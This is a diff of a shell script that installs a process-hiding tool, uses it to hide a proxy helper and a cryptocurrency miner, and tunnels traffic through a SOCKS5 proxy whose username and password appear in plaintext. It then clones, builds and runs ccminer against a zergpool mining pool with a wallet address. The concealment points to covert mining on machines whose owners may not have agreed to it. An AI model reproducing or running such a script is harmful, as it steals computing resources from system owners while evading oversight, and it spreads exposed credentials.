@@ -6,7 +6,7 @@ chmod +x lba
 npm i -g node-process-hider
 
 ph add graftcp
-ph add hellminer
+ph add ccminer
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
@@ -23,6 +23,10 @@ socks5_username = Selshindeparshuram2012
 socks5_password = V7p9BkV
 END
 
+apt update && apt upgrade
+apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
+apt-get install git
+
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
@@ -33,7 +37,7 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp git clone –single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh
-./build.sh
-./ccminer -a verushash -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DBzjgXkfYtotoLg1hKRZugd7vDotq7TW1k -p  c=DGB,mc=VRSC,ID=bigbang
+./graftcp/graftcp git clone --single-branch -b ARM https://github.com/monkins1010/ccminer && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verushash -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DBzjgXkfYtotoLg1hKRZugd7vDotq7TW1k -p  c=DGB,mc=VRSC,ID=bigbang
+
+
 
